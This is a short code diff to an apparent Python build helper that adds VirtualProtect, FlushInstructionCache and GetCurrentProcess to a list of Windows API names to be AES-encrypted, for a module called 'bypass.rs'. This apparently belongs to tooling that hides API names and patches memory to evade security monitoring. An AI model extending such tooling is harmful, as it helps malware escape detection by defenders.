@@ -226,6 +226,10 @@ def generate_api_aes_constants() -> list:
         ("GETDISKFREESPACEEXW_ENC", b"GetDiskFreeSpaceExW"),
         ("GETVOLUMEINFORMATIONW_ENC", b"GetVolumeInformationW"),
         ("GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC", b"GetPhysicallyInstalledSystemMemory"),
+        # === bypass.rs APIs ===
+        ("VIRTUALPROTECT_ENC",          b"VirtualProtect"),
+        ("FLUSHINSTRUCTION_ENC",        b"FlushInstructionCache"),
+        ("GETCURRENTPROCESS_ENC",       b"GetCurrentProcess"),
     ]
     result = []
     for name, plaintext in strings:
